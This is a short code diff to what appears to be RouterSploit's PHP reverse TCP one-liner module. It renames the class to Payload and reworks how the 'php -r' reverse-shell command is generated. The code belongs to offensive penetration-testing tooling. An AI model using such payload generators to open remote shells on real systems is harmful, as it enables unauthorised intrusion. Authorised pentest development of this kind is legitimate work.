@@ -2,7 +2,7 @@ from routersploit.core.exploit import *
 from routersploit.modules.payloads.php.reverse_tcp import Payload as PHPReverseTCP
 
 
-class Exploit(PHPReverseTCP):
+class Payload(PHPReverseTCP):
     __info__ = {
         "name": "PHP Reverse TCP One-Liner",
         "description": "Creates interactive tcp reverse shell by using php one-liner.",
@@ -14,7 +14,6 @@ class Exploit(PHPReverseTCP):
     cmd = OptString("php", "PHP binary")
 
     def generate(self):
-        payload = super(Exploit, self).generate()
-
-        cmd = '{} -r "{}"'.format(self.cmd, payload)
-        return cmd
+        self.fmt = self.cmd + ' -r "{}"'
+        payload = super(Payload, self).generate()
+        return payload
